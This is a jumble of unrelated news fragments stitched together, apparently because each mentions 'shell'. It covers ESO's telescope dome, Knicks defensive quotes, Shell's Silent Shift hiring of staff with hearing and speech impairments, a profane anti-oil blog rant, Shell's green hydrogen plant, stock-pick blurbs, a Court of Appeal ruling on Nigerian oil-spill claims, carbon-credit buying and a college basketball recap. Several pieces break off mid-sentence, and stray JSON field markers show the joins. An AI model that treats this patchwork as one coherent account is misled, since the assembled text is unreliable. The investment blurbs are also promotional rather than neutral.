The mighty telescope is expected to see its \"first light\" by 2028.\n\nNew photos from the ESO show that the dome's frame is now completed, while the outer shell that will fully enclose the telescope is still under construction. Plates of aluminum will be added to the exterior of the frame to protect the telescope from the extreme environment of the Atacama desert, including variable temperatures, according to a statement from the observatory.\n\nThe dome measures 305 feet (93 meters) in diameter, or about the size of a football field and stands 263 feet (80 meters) tall. The dome will house the ELT, which aims to observe terrestrial exoplanets and their atmospheres, as well as measuring the expansion of the universe.\n\nESO's Extremely Large Telescope under construction in the Atacama desert in January 2025. (Image credit: ESO/G. Vecchia)\n\nThe latest progress photos taken in January 2025 show cranes busy at work installing the outer aluminum layers, also known as cladding.

The center structure will support the telescope's large central mirror and secondary mirror. (Image credit: ESO/G.

M1 will measure a whopping 128 feet (39 meters) across, while M2, which is expected to be completed later this year, will measure 14 feet (4.25 meters) in diameter. The telescope will have three smaller mirrors, for a total of five once complete.\n\nESO's Extremely Large Telescope under construction in the Atacama desert in January 2025. (Image credit: ESO/G.

While the skeleton itself is complete, it is waiting to receive all of the individual segments that will make up the five mirrors. M1 alone will consist of 798 glass ceramic hexagonal segments, each of which measure about 2 inches (5 centimeters) thick and about 5 feet (1.5 meters) across. When fully assembled, M1 will be the largest mirror ever built for an optical telescope.\n\nGet the Space.com Newsletter Breaking space news, the latest updates on rocket launches, skywatching events and more!

It\u2019s containment and the dribble penetration. And there\u2019s so many different aspects of you\u2019re in defensive transition, individual defense, and then it\u2019s your shell. Your shell really applies to everything.\n\n\u201cSo that\u2019s why I\u2019m saying when you\u2019re guarding the ball, there needs to be communication: You can\u2019t get beat with a penetrating drive on the first drive.\n\n\u201cMaybe our physicality could have been better there. So that\u2019s a big part of it. And then are we caught in-between [a rotation]? You want to be in already, so when the ball is being picked up, you\u2019re starting your recovery. A step makes a big difference.\u201d\n\nOn failing to spot Anthony Edwards:\n\n\u201c[Edwards] was very, very aggressive throughout, and the one thing is his volume of 3s has gone way up this year, so I knew he would keep shooting, and he made a number of good plays as well.\n\n\u201cBut he\u2019s a tough cover, and you need all 5 working together and you\u2019ve gotta try to make him work, and that\u2019s probably the biggest thing is to make him work.\n\n\u201cHe\u2019s gonna get some, but you\u2019ve gotta make him work for those points, and that requires everyone working together.\u201d\n\nOn the supposedly easy home-heavy schedule doing the Knicks no favors:\n\n\u201cIt\u2019s just the way the schedule goes and at the end\u2014you play 41 at home, 41 away.\n\n\u201cWe\u2019ve had a long stretch now where we haven\u2019t had any breaks, but we\u2019ve got a bunch of breaks coming up. But just lock in every day and that\u2019s what we try to do.\n\n\u201cThis time of year practice is important, but you have periods in your schedule where it\u2019s dense and you\u2019re traveling.\n\n\u201cYou have to maximize all the time that you do have. Whether it\u2019s a ballroom walk-through or a film session, team meeting, whatever it may be. You go into the season with that understanding.\n\n\u201cThere\u2019s going to be ebbs and flows to the season, the schedule, and how we manage it is important.\u201d\n\nJalen Brunson\n\nOn defensive struggles and his problems defending at the point of attack after getting screened:\n\n\u201cThere\u2019s always room for improvement in every single aspect of our game and we\u2019re not going to just single [defensive rotations] out. It may have looked like that tonight but as a team, we just need to be locked in.\n\n\u201cFor me, I have to be locked in as well. It starts with me.\u201d\n\nOG Anunoby\n\nOn the need for a big defensive improvement:\n\n\u201cThere\u2019s always room for improvement. We can always get better.\n\n\u201cSometimes we were there and they made the shots. Sometimes we weren\u2019t there and they didn\u2019t make the shot. That\u2019s just how it went. But they made more shots than missed.\n\n\u201cI guess they\u2019re just making shots so I guess we\u2019re not doing a good job of closing out. We got to improve on that.\u201d",

And \u2018access\u2019 is a major variable that widens the gap between talent sourcing and people finding suitable jobs. Shell , a multinational oil and gas company, is making intentional efforts to bridge this gap by employing more people from the PwD community. Every bit of work at the retail stations at Shell has a representation of people with some sort of disabilities, be it job roles ranging from fuelling, cash, supervising, technical roles, etc.\u201cWe make sure that not just our workplace is accessible, but the opportunities as well. We aspire to be the most diverse and inclusive company in the world. As a part of that, we focus on three key areas: Gender, Disability and LGBTQI in India. Under the disability enablement comes the \u2018 Silent Shift .\u2019 The silent shift is run primarily by people with speech and hearing impairments. And this industry-first attempt was started in one of our retail outlets in Pune in 2022,\u201d says Sanjay Varkey , Director, Shell Mobility India Shell has 4,500 employees working in its 350 stations. And about 12 per cent (more than 500) of the total employees are differently-abled ! They take on a wide range of job roles, such as Forecourt Attendant, Supervisor, Cashier, Technician, Barista and Air Gauge Operator.\u201cThe access to the opportunities where they are generally not considered a natural fit makes them feel more valued, respected and empowered. And it was an AHA moment for us when it happened for the first time. When our first attempt became successful, we replicated this model in Bengaluru and Hubli in 2023,\u201d says Varkey.Varkey gives the whole credit for ideating the concept of the silent shift to their frontline champions, retailers and the territory managers. At present, there are more than 20 employees with hearing and speech impairments working in the firm\u2019s three retail outlets across three cities. It means there would typically be eight staff operating at the moment in a silent shift.Somebody with a different need should be recognised well. We cater to their cultural needs, including the safety aspects and inclusion. People should be able to bring their whole selves to work without hiding any part of them. That\u2019s the cultural movement that we want to create. And, for that, we need to tackle the existing biases by bringing a change to the mindsets and behaviours,\u201d Varkey says.\u201cRecently, Pandya Rajan, a staff working in the silent shift was the winner of India's top service champion, our Rewards & Recognition programme. The best aspect of this reward is that they are not a champion for disability, but a champion for what they deliver!\u201d Varkey exclaims.Recollecting a memorable and cherishing story from their SB Road station, Varkey, shares, \u201cA customer, initially unaware that the service champion assisting her was differently abled, was deeply moved by his courteous and seamless service. This experience turned her into a loyal patron, and she now visits regularly, often bringing chocolates to show her appreciation for the team's dedication. She has also praised our efforts in empowering differently-abled staff and ensuring their success. Stories like this reflect the power of inclusivity, incredible impact and the outstanding service our Silent Shift teams deliver every day.\u201dVarkey says, \u201cWe work in collaboration with NGOs to proactively source talent. And, nowadays, referrals are our major channels. We make sure that not just our workplace is accessible, but the opportunities too!\u201dVarkey shares that even the NGOs that they have consulted for sourcing talents were concerned about whether the hearing and speech-impaired persons would come and work at a fuel station. Similarly, the individual would also have this doubt. And the beauty of the whole aspect is tackling these two-way apprehensions. \u201cIt's normally our apprehensions that stop us. But if we are committed to doing something, we will figure out the ways to do it, rather than coming up with reasons to not do it,\u201d he says.Ensuring safety was the biggest concern for the firm while initiating the silent shift. A wrong communication can even trigger the safety aspect in a high-risk working environment. The firm addresses the safety concerns by finding solutions to these questions:To tackle some of these concerns,. For instance, the company replaced the emergency alarm with a light to signal if something goes wrong. And if it\u2019s a serious emergency, the site staff can blow the whistle to call the retailer staff for instant help. \u201cAlso, there can be cases where they might not be able to answer a customer\u2019s question. In such cases, they can call the supervisors or retailers for support,\u201d Varkey says.He adds, \u201cTraining plays a big part. To train them to operate independently, we focus on the safety and product aspects. For the first \u2018silent shift\u2019 batch, it took almost a month to train. This training period varies from person to person depending on their ability to pick up. We also work with NGOs and, as their communication with customers plays an important role in their job role. Even the retailers and other staff are trained in sign language, as they are conversing more with the workers in the silent shift. And we continuously reinforce and recheck to make sure everything is going right.\u201dA major focus of the HR department is to create an inclusive environment by making people realise the challenges of differently-abled individuals. \u201cEven during the onboarding time, we ask them what is working and not working so that we can make adaptations to support their work. It can even be as simple as making adjustments in their chair,\u201d Varkey says.Enable network is the Employee Resource Group addressing the concerns of the PwD community by increasing awareness and working with people to even contribute externally through initiatives like Shell Inclusion Accelerator and Shell Inclusion Excellence. This includes. \u201cWe also allow some of our incubator skill pool to mentor these startups. Some of the startups work on solutions like digitising the braille by making it audible, non-surgical solutions like deploying electrical signals to tackle spinal cord problems, etc,\u201d Varkey says.Shell has 38 per cent women employees at the leadership level and 28.5 per cent women ratio at the overall level. \u201cThe first misconception about fuel stations or the petroleum industry would be that this is not a place for women and differently-abled people. We wanted to challenge this view and hope people can see this through our commitment to delivering this promise.\u201d Varkey says.\u201cWe have about 23 per cent of women employees working at the fuel stations, which is the highest from an industry standpoint. We also have an all-women retail outlet. It is to demonstrate that a fuel station can be completely run by women. Besides that, if you notice, all of our fuel stations have a women-representation. We even have a lot of women and differently-abled drivers. This allows us to connect well with diverse customers as we have multiple viewpoints for solutions,\u201d Varkey adds.Varkey says, \u201cAddressing the human side is all of our responsibility. It\u2019s not just an HR job. All of us, beyond the job titles, have that responsibility. My purpose in life is to make a difference in the life journey of people. And this role fits perfectly with my job designation as a CEO.\u201dVarkey shares that sourcing talent from the LGBTQI community is even more challenging than differently-abled talent considering the societal stigma. \u201cAs of now, we have 12 staff from the transgender community. And they also work in front-end job roles that involve customer interaction. Actually, I met one of them when I was on a trip to Baroda. She (who wanted to be known as he) wanted to be a technician and we trained him!\u201d he says.According to Varkey, the company\u2019s biggest D&I concerns include sourcing the D&I talents, creating an inclusive space for them, and sensitising them and everyone else in the organisation. \u201cBecause the heightened awareness will create more acceptance . This in turn will create a positive cycle where a lot of people keep joining Shell,\u201d he says.",

            "content": "Posted by John Donovan: 19 Jan 25.\n\nWhat the f**k is going on at BP?\n\nMurray Auchincloss, the latest placeholder in BP\u2019s revolving door of CEOs, is heading for his judgment day. Investors are sharpening their knives, and on February 26, they might just gut his tenure like a sacrificial lamb. Why? Because unlike Shell\u2014the ultimate sin stock, the Exxon of Europe, the undisputed king of greed\u2014BP has been fumbling its way through an identity crisis. And investors? They\u2019ve had enough of BP\u2019s weak attempts at greenwashing when there\u2019s good old-fashioned oil money to be made.\n\nThe Shell of the Earth\n\nLet\u2019s take a moment to admire Shell\u2014because if there\u2019s one company that knows how to squeeze every last drop of profit from a burning planet, it\u2019s them. Under the ruthless command of Wael Sawan, Shell has made its position crystal clear: fuck the planet, full steam ahead. And guess who\u2019s laughing all the way to the bank? Shell\u2019s biggest investors, including the vampiric juggernaut that is BlackRock, whose commitment to \u201csustainable investing\u201d is about as believable as a BP pledge to go carbon neutral.\n\nWhile BP flounders in an existential crisis, Shell is busy hunting acquisitions like a starving wolf pack, slashing debt, and showering shareholders with buybacks and dividends. Meanwhile, BP\u2019s stock price is down 7% under Auchincloss\u2019s tenure, a pathetic showing compared to Shell\u2019s financial gluttony. Investors are watching Shell\u2019s every move with admiration and asking BP: why can\u2019t you be more like them? You know, more ruthless, more polluting, more unapologetically evil.\n\nBP\u2019s Flaccid Leadership\n\nAuchincloss, the most uninspiring CEO in the oil world, was supposed to be the \u201csafe pair of hands\u201d to steady BP after Bernard Looney\u2019s scandal-induced exit (because apparently, BP execs can\u2019t keep their hands off their colleagues). But let\u2019s be real: nobody wants \u201csafe\u201d in the cutthroat world of fossil fuels. Investors want someone who will drill, pump, and burn with reckless abandon. Instead, they got a guy whose biggest accomplishment so far has been\u2026 postponing a meeting.\n\nBP\u2019s big issue? Rolling back Looney\u2019s green nonsense without looking like total hypocrites. Investors hated Looney\u2019s plan to slash oil and gas production by 40% by 2030\u2014what an absolute joke! Cut hydrocarbons? While oil prices are soaring thanks to global chaos? Not on Shell\u2019s watch. No wonder BP is an outlier while Shell thrives.\n\nAuchincloss is reportedly itching to undo Looney\u2019s plans, but he\u2019s dithering like a deer in the headlights. Shell, meanwhile, doesn\u2019t dither. Shell doesn\u2019t hesitate. Shell acts. Investors love that. That\u2019s why Shell is booming while BP is flailing.\n\nCorporate Cannibalism: Will BP Be Devoured?\n\nIf BP doesn\u2019t get its act together, it\u2019s ripe for the picking. Shell could swoop in and gobble it up, or maybe Chevron or ExxonMobil will take a bite. Investors are drooling over the idea. The irony? Auchincloss and his exec team wouldn\u2019t even be able to stop it.\n\nSo, what\u2019s the solution? Should BP find its own Wael Sawan? Someone to lead the company into the promised land of obscene oil profits while paying lip service to \u201cnet zero\u201d fantasies? Or should they just roll over and let the American oil giants take over?\n\nEither way, Shell remains the golden standard of corporate soullessness, a beacon of unrelenting environmental destruction, and a shining example of how to make money while the world burns. BlackRock and the rest of the investor cabal couldn\u2019t be prouder.\n\nBP? You\u2019re either all in, or you\u2019re out. Time to decide.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

He more than doubled his offensive production against the Huskies, who lost for the second time in three games.

The bar is so low for us defensively. We\u2019re just not a tenacious enough team. Long winning streak at home goes out the window, but this team wasn\u2019t responsible for those long winning streaks.\"\n\nAd\n\nCreighton's balanced offense dooms Dan Hurley's UConn Huskies\n\nIt wasn\u2019t just Jamiya Neal who punished Dan Hurley and the No. 14 UConn Huskies as three other players scored in double figures for Creighton. Ryan Kalkbrenner scored 16 points and grabbed 10 rebounds to record his sixth double-double of the season. Steven Ashworth added 12 points and nine assists.\n\nCreighton Bluejays center Ryan Kalkbrenner (11) and guard Jamiya Neal (5) look to the sideline as they take one the UConn Huskies in the first half at Harry A.

            "content": "Shell\u2019s green hydrogen factory: a solar panel on a petrol pump \u2013 De Correspondent\n\now a modest construction site on the windy Tweede Maasvlakte, soon Shell\u2019s very latest factory. Under the sway of wind turbine blades, the oil and gas giant is building a place where, starting in 2026, sixty thousand kilos of \u2018green hydrogen\u2019 will be produced every day: Holland Hydrogen 1. *\n\n\n\nBen van Beurden, then CEO of Shell, at the announcement in 2022, said :\n\nWe are building the factory of the future\n\nBut the factory, which Shell sees as a \u2018 new chapter in the energy transition\u2019, * in reality hardly yields any gain for the climate. This becomes clear when we calculate the CO2 footprint of Shell\u2019s products, with and without the green hydrogen from the new factory.\n\nThat sustainable energy experts * and even an environmental organization like Greenpeace * nevertheless see the factory as a good move, shows how complex the energy transition is in practice. Shell is the only one, they say, that can build such a factory at the moment. And that exposes a broader problem: we have become dependent on fossil companies, in the task of getting rid of fossil fuels.\n\nGreen hydrogen is the future\n\nHydrogen: the tiniest atom of all, perhaps best known for its presence in water (as the \u2018H\u2019 in \u2018H2O\u2019). Hydrogen is by far the most abundant element in the universe, and you could consider it the most fundamental building block of the universe. It\u2019s not for nothing that hydrogen has atomic number 1. *\n\n\n\nUnlike fossil fuels, pure hydrogen is not extracted from natural sources or pumped from the ground. Pure hydrogen, a colorless and odorless gas, is made in a factory. This can be done simply by electrifying water to separate the H\u2019s and O\u2019s \u2013 and voil\u00e0, pure hydrogen gas.\n\nLike natural gas, hydrogen is flammable. * When hydrogen gas is burned, no CO2 is released, only water. This property makes it an alternative to fossil fuels.\n\nWhen a hydrogen plant runs on renewable electricity from wind turbines or solar panels, the hydrogen produced has a zero CO2 footprint, is climate neutral and can be called \u2018green hydrogen\u2019.\n\nA gas that you can produce and burn without CO2 emissions: that sounds ideal within the context of the energy transition.\n\nIndustry is eyeing green hydrogen. Particularly in sectors where it is difficult to replace fossil fuels such as coal or oil with electricity, green hydrogen is seen as the way to become CO2-free. Think of the steel industry, * the production of artificial fertilizer * or trucks that have to travel long distances. *\n\nAnother often-mentioned application of hydrogen: it can serve as a backup for the energy system, * necessary in a future with only green electricity. You can burn it \u2013 just like natural gas \u2013 in power stations to generate electricity during periods when the sun is not shining and the wind is not blowing\n\nShell\u2019s Holland Hydrogen 1 plant, which will be connected to wind turbines in the North Sea, * will be Europe\u2019s largest green hydrogen plant upon completion.\n\nExpectations are high. Rotterdam wants to become the green hydrogen hub of Europe. * The hydrogen pipeline from Holland Hydrogen 1 will be expanded in the coming decades to a network that not only covers the Netherlands, but is also connected to the rest of the continent via Belgium and Germany. * The EU sees green hydrogen as a \u2018key component\u2019 of its transition strategy and wants it to cover no less than 10 percent of the total energy requirement in 2050. That share is currently almost zero. *\n\nYou could say that Shell is doing well with Holland Hydrogen 1 in promoting the energy transition and combating climate change.\n\nFrom green to gray\n\nBut the green sheen quickly disappears when you follow the route of the (now partly constructed) underground gas pipe \u2013 the pipe through which the future green hydrogen will leave the factory and travel to its destination.\n\nThrough the older parts of the port, straight through an area of \u200b\u200bblack mountains of coal and white storage tanks for fossil fuels, past the silver tangle of pipes of the BP oil refinery, more storage tanks and another oil refinery, the pipe reaches its final destination: the Shell factory in Pernis. A factory where crude oil is processed into petrol, kerosene and diesel.\n\nREAD the latest news shaping the hydrogen market at Hydrogen Central\n\nShell\u2019s green hydrogen factory: a solar panel on a petrol pump \u2013 De Correspondent, source",

            "content": "In addition to the few tech giants regularly making headlines with their gains, large-cap dividend stocks could also be an attractive option for investors looking for a reliable, significant, and growing stream of income. According to Howard Silverblatt, Senior Index Analyst at S&P Dow Jones Indices, the broader US large caps are expected to post an 8% increase in dividend payments in 2025, compared to the 6.4% uptick in 2024, 5.1% gains in 2023, and the 10.8% increase witnessed in 2022.\n\nThat said, the expected upcoming fluctuation isn\u2019t going to be something that the mega corporations haven\u2019t dealt with before. A 2023 report by J. P. Morgan revealed that despite the considerable volatility during the period, large-cap stocks gained around 162% between 2013 and 2023, galvanized primarily by big tech. Another 2023 report by CNBC unveiled that large US companies outperformed other investments between 2003 and 2023, with average returns of 9.3%. However, it hasn\u2019t always been a smooth ride, as despite the stability and reliability large-cap stocks are known for, investors had to survive drops of 56.8% during the 2007-2009 bear market, 33.9% in 2020, and 25.4% in 2022.\n\nHowever, the tailwinds that propelled the market to new heights are beginning to recede, as the rate of monetary policy easing slows down, long-term interests swing upward, inflation becomes sticky, and the US economy is slowing down. Moreover, the upcoming presidency of Donald Trump and his much-rumored tariffs could also herald a more volatile period for markets, as they could further fan inflation fears and put pressure on stock prices.\n\n2024 proved to be a big year for large-cap stocks, as the broader US market achieved gains of nearly 25%, piggybacking on a 26% performance the year before. Large-cap stock funds, with the heaviest tilt toward growth stocks, performed the best last year, even as the market\u2019s rally somewhat broadened from the handful of mega tech companies that have led much of the bull market.\n\nCompiled and published by Fortune Magazine, the Fortune 500 is an annual list that ranks the biggest US companies by revenue. In total, the Fortune 500 companies represent two-thirds of the US GDP with $18.8 trillion in revenues, $1.7 trillion in profits, and $43 trillion in market value (as of March 28, 2024), and they employ a workforce of 31 million around the globe.\n\nWe recently published a list of 12 Best Fortune 500 Dividend Stocks To Buy Right Now . In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best Fortune 500 dividend stocks to buy right now.\n\nStory Continues\n\nLarge-cap companies tend to have more robust balance sheets compared to their smaller counterparts, enabling them to navigate through market fluctuations more smoothly while also returning value to their shareholders. Corporations in the US have continuously grown their considerable cash stockpiles since the beginning of the pandemic, thanks to the economic resilience we have witnessed recently. A report from treasury advisory firm Carfang Group revealed that as of Q1 2024, US corporations increased their cash holdings to an all-time high of $4.11 trillion, up 12.6% from the same period in 2024 and $1.28 trillion more from their pre-pandemic levels.\n\nMethodology\n\nTo collect data for this article, we referred to the top 50 companies among the Fortune Global Rankings. Then, we picked out 12 US-listed companies with the highest dividend yields as of January 13, 2025, and ranked them by their number of hedge fund investors according to the Insider Monkey database as of Q3 2024.\n\nAt Insider Monkey we are obsessed with the stocks that hedge funds pile into. The reason is simple: our research has shown that we can outperform the market by imitating the top stock picks of the best hedge funds. Our quarterly newsletter\u2019s strategy selects 14 small-cap and large-cap stocks every quarter and has returned 275% since May 2014, beating its benchmark by 150 percentage points (see more details here).\n\nIs Shell plc (SHEL) The Best Fortune 500 Dividend Stock To Buy Right Now?\n\nA gas refinery lit up against the night sky, showing the scale of the company's petrochemical operations.\n\nShell plc (NYSE:SHEL)\n\nNumber of Hedge Fund Holders: 48\n\nDividend Yield: 4.24%\n\nMarket Cap: $197 billion\n\nShell plc (NYSE:SHEL) is one of the largest oil and gas companies in the world, operating through the following segments: Integrated Gas, Upstream, Downstream, and Corporate.\n\nShell plc (NYSE:SHEL) is also transitioning towards a low-carbon future and announced last year that it would invest $10-15 billion into low-carbon energy solutions by 2026. However, the company has come under fire after its Q3 2024 investments in renewable energy fell to 8% of its overall capital expenditure, down from 9% in the previous quarter. Shell is also stepping back from new offshore wind investments and is splitting its power division following an extensive review of the business that was once seen as a major driver of the oil major\u2019s energy transition strategy. The decline in green energy investments comes after the oil major weakened its 2030 carbon emissions reduction target in March last year.\n\nHowever, Shell plc (NYSE:SHEL)\u2019s investments in its traditional fossil fuels business continue and the company announced recently that it has started production at its offshore Whale floating facility located in the Gulf of Mexico, further enhancing its portfolio in the region. Moreover, it was also recently announced that Shell and Norway\u2019s Equinor are to combine their UK offshore oil and gas assets and expertise to form a new company which will be the UK North Sea\u2019s biggest independent producer.\n\nShell plc (NYSE:SHEL) is also the top global lubricant supplier and number one globally in liquified natural gas (LNG), a sector that is expected to grow substantially over the coming decade. However, the company recently trimmed its LNG production outlook for the fourth quarter of 2024 and warned that trading in its gas and chemicals divisions would be \u2018significantly lower\u2019 than in Q3. Moreover, Shell plc (NYSE:SHEL) is also poised to take a non-cash, post-tax impairment of between $800 million and $1.2 billion on its renewables business (linked to European and North American assets) in Q4 2024.\n\nDespite the tough macroeconomic situation faced by the oil and gas industry, Shell plc (NYSE:SHEL) announced at the end of Q3 2024 that it would buy back a further $3.5 billion of its shares until the end of 2024 while holding its dividend unchanged at $0.34 per share. This marked the 12th consecutive quarter that the oil and gas giant had announced at least $3 billion in buybacks.\n\nShell plc (NYSE:SHEL) has also been included in our list of the 10 Best FTSE Dividend Stocks to Buy Now.\n\nOverall, SHEL ranks 10th on our list of best Fortune 500 dividend stocks to buy right now. While we acknowledge the potential for SHEL as an investment, our conviction lies in the belief that some AI stocks hold greater promise for delivering higher returns and doing so within a shorter time frame.

Shell PLC and The Shell Petroleum Development Company of Nigeria Ltd [2024] EWCA Civ 1500, allowing a challenge against the \"global claim\" approach to an environmental claim against Shell endorsed by the High Court. The Court of Appeal accepted the Claimants' argument that a \"lead case\" approach would be more efficient. This decision provides critical guidance on case management for complex environmental claims in the English courts, clarifying that the right of a litigant to bring a claim and determine how it is proved should be \"respected in all normal circumstances\".\n\nThe claim is brought by approximately 14,000 residents of the Bille and Ogale regions in Nigeria which have been affected by more than 100 oil leaks resulting from Shell's infrastructure. The Claimants allege that negligence by Shell's UK-based parent company (Shell PLC) and its Nigerian subsidiary (Shell Petroleum Development Company of Nigeria) caused extensive pollution and contamination of water sources.\n\nIn 2023, the High Court ruled that the Claimants must show a causal link between their individual losses and specific acts of pollution. Given the scale and complexity of the case, the Claimants faced significant challenges in doing so. By the time of the High Court hearing, only five had been able to establish such a causal link.\n\nThis difficulty prompted the High Court to adopt a \"global claim\" approach instead of a \"lead case\" approach. Under the global claim approach (which is commonly used in contractual disputes in the area of construction), the Claimants would have to prove that Shell was responsible for all pollution causing the environmental contamination. If there were any other sources of pollution that contributed to their losses but to which Shell did not contribute, each individual's claim would fail.\n\nThe Court of Appeal set aside the High Court's ruling. It held that \"no judge or court is entitled to require a party to establish their case by a particular method\" and that \"until the point is reached where a claim is to be dismissed or stayed, the right of a litigant to bring the claim and the freedom to determine how it intends to prove its claim should be respected in all normal circumstances\".\n\nInstead of a global claim, the Court of Appeal recommended using the more typical lead case approach, whereby one or more representative claimants act as focal points for the litigation, concentrating resources on specific cases that embody broader issues and so making the litigation more manageable and efficient.\n\nThe Court of Appeal also dismissed an appeal by the Defendants, who had sought to overturn the High Court's grant of permission to the Claimants to amend their Particulars of Claim.\n\nThe Court of Appeal's judgment has significant implications, including in relation to the role of lead cases in efficient case management of complex environmental litigation. This decision also reaffirms the English courts' readiness to hear complex international environmental claims and addresses associated procedural and jurisdictional challenges.",

            "content": "In the race to offset their carbon footprints, two giant companies\u2014Shell and Microsoft\u2014stand out as the largest carbon credit buyers in 2024, according to the Allied Offsets report. Their massive retirements reflect differing strategies and priorities, however, signaling distinct approaches to tackling carbon emissions through carbon markets.\n\nShell, the world\u2019s largest fossil fuel company, and Microsoft, a technology leader, have been pivotal players in the voluntary carbon market (VCM). However, their activities reveal stark contrasts in how they approach sustainability goals and what projects they support.\n\nMeanwhile, the broader carbon credit market in 2024 showed a growing emphasis on removals and diversification of project types.\n\nShell: The Emission Offset Leader\n\nShell retained a massive 14.5 million carbon credits in 2024, taking the top spot for the second consecutive year. This commitment is a significant part of Shell\u2019s strategy to offset its extensive emissions.\n\nUnlike Microsoft, which has heavily invested in carbon removal technologies, Shell\u2019s purchases mainly target projects focused on emissions avoidance.\n\nA large portion of Shell\u2019s credits\u20149.4 million\u2014came from forestry and land-use initiatives. These projects, focusing on protecting and managing forests to prevent the release of stored carbon, are cost-effective but also face scrutiny over integrity concerns. Interestingly, the energy giant announced plans in November last year to sell part of its nature-based carbon projects.\n\nThe company also retired 2.4 million renewable energy credits, a cheaper and more widely accepted option in the market.\n\nMoreover, the price difference between Shell\u2019s credits and Microsoft\u2019s illustrates their contrasting strategies. While Shell paid an average of $4.15 per credit, it remains focused on more affordable projects, including renewable energy and forestry.\n\nDespite criticisms over the quality of some of its projects, Shell continues to be a significant player, aligning its credit purchases with its ongoing goal of achieving net-zero emissions by 2050. To achieve that, the oil major aims to reduce emissions from its operations by 50% by 2030, using 2016 baselines.\n\nMicrosoft: A Carbon Removal Champion\n\nIn contrast, Microsoft has pursued a more aggressive approach toward carbon removal, setting itself apart with a robust commitment to investing in innovative carbon capture technologies. The company retired 5.5 million credits in 2024, a distant second to Shell. However, the type of credits the tech giant bought tells a different story.\n\nA key focus for Microsoft has been on bioenergy with carbon capture and storage (BECCS). It is an expensive and emerging technology that is capable of delivering carbon-negative results. BECCS works by capturing the carbon dioxide released during the burning of biomass and storing it underground.\n\nNearly 80% of Microsoft\u2019s 2024 carbon credits came from BECCS projects, with the largest purchase of 3.3 million credits coming from Sweden\u2019s Stockholm Exergi. While this technology is still in its infancy, it plays a critical role in global pathways to achieving net-zero emissions.\n\nMicrosoft\u2019s strategy, however, is not without its challenges. BECCS credits are costly, with average prices of $389 per credit\u2014substantially higher than the costs associated with Shell\u2019s projects.\n\nIn 2024, Microsoft\u2019s average credit price was $189, a significant investment considering its aim to neutralize emissions across its operations.\n\nDespite the high costs, Microsoft\u2019s commitment to carbon removal reflects its leadership in the tech industry\u2019s broader sustainability agenda. The major tech company aims to be carbon-negative by 2030.\n\nMicrosoft\u2019s strategy to focus on carbon removals seems to be on the right track. The broader carbon market trend reveals the growing interest in carbon removal credits.\n\nCarbon Market Dynamics: Increasing Focus on Quality and Carbon Removal Credits\n\nThe VCM in 2024 has shown signs of shifting, with a significant uptick in carbon removal credits, per the report. However, overall retirement activity in the VCM plateaued, with 2024 marking the third consecutive year of minimal growth.\n\nThe decrease in market growth is not necessarily a negative development, as more buyers have shifted toward high-quality, impactful projects.\n\nWhile Shell and Microsoft represent the extremes in carbon credit purchasing, other buyers are increasingly exploring removals and non-traditional carbon offset projects. Removals, such as those associated with BECCS, saw a larger share of the market, though they still constitute a small portion overall.\n\nThis shift reflects a broader trend toward supporting innovative carbon removal solutions, which can deliver long-term, lasting environmental benefits. Another report by the MSCI also reveals the same trend\u2014demand for carbon removal credits is rising.\n\nThe market\u2019s composition is also diversifying. Projects related to renewable energy and forestry still dominate. However, their share in total credit retirements has decreased from 80% in 2020 to 70% in 2024.\n\nAt the same time, new entrants into the market are pushing for more varied solutions, including technologies for direct air capture and carbon removal, which add complexity to an already challenging marketplace.\n\nChallenges for Credit Buyers and the Market\n\nOne of the major challenges for buyers is the oversupply of carbon credits in the market, which continues to grow. In 2024, the number of issued but not retired credits increased again, contributing to a potential glut in available credits.\n\nThis dynamic is particularly evident in the market for older Clean Development Mechanism (CDM) credits, which have increasingly been criticized for their lack of additionality and impact.\n\nDespite these challenges, the number of active buyers in the VCM continues to grow. In 2024, more than 6,500 companies participated in the market, a slight increase compared to previous years.\n\nThe vast majority of carbon credit buyers continue to come from the financial and energy sectors, with Microsoft representing a key player in the tech space. Even though more companies are entering the market, the rate of growth has slowed. This suggests that carbon credits are becoming a more established component of sustainability strategies.\n\nAs we move into 2025, the divergent strategies of Shell and Microsoft may serve as a model for others seeking to engage with the VCM. Shell\u2019s focus on affordability and scale contrasts with Microsoft\u2019s commitment to cutting-edge carbon removal technologies.\n\nYet, both companies are working towards a common goal\u2014neutralizing their emissions and supporting global climate efforts.\n\nAs the market continues to evolve, these two companies are likely to remain at the forefront of shaping how businesses approach their carbon footprint and the critical role carbon credits play in the global fight against climate change.",

These research reports have been hand-picked from the roughly 70 reports published by our analyst team today. You can see all of today\u2019s research reports here >>> Salesforce shares have outperformed the Zacks Computer - Software industry over the past year (+18.1% vs. +14.1%). The company is benefiting from a robust demand environment as customers are undergoing a major digital transformation. Its sustained focus on aligning products with customer needs is driving the top line. Continued deal wins in the international market are another growth driver. The buyout of Slack has positioned it as a leader in enterprise team collaboration and improved its competitive standing compared to Microsoft Teams. Salesforce\u2019s strategy of continuous expansion of generative AI offerings will help it tap the growing opportunities in the space. However, stiff competition and unfavorable currency fluctuations are concerns. Softening IT spending amid ongoing macroeconomic uncertainties may hurt its growth prospects. (You can read the full research report on Salesforce here >>> ) Shares of Shell have gained +14% over the past year against the Zacks Oil and Gas - Integrated - International industry\u2019s gain of +14.8%. The company remains a global leader in liquefied natural gas. The company leverages its strong LNG position, bolstered by the acquisition of BG Group, to generate consistent earnings by capitalizing on steady demand for this transitional fuel. Shell\u2019s strategic joint venture in the UK North Sea with Equinor enhances its dominance in the region while aligning with high-value objectives. Meanwhile, the company\u2019s strong free cash flow generation and sustained buybacks reinforce shareholder value. However, the underperformance of its Renewable segment is a matter of concern. Another concern is the sub-100% reserve replacement ratio, indicating challenges in replenishing produced energy. Sensitivity to oil prices and the rise of EVS are other negative factors. Therefore, investors are advised to wait for a better entry point. (You can read the full research report on Shell here >>> ) Gilead shares have outperformed the Zacks Medical - Biomedical and Genetics industry over the past year (+12.8% vs. -13%). The company\u2019s flagship HIV therapy, Biktarvy, continues to maintain its strong growth, fueling the top line. The company\u2019s efforts to develop better HIV treatments are commendable. Recent data validate lenacapavir\u2019s potential to prevent HIV. The successful development and approval of lenacapavir for the prevention of HIV will be a significant boost for Gilead, given its advantages over existing treatments. Strong quarterly results and encouraging data on lenacapavir data have helped share prices increase past year. According to the Zacks analyst sales estimates for Biktarvy indicate a CAGR of around 5.7% over the next three years. Gilead's efforts to bolster its oncology and virology franchises through internal pipeline development and collaborations are impressive as well. However, recent 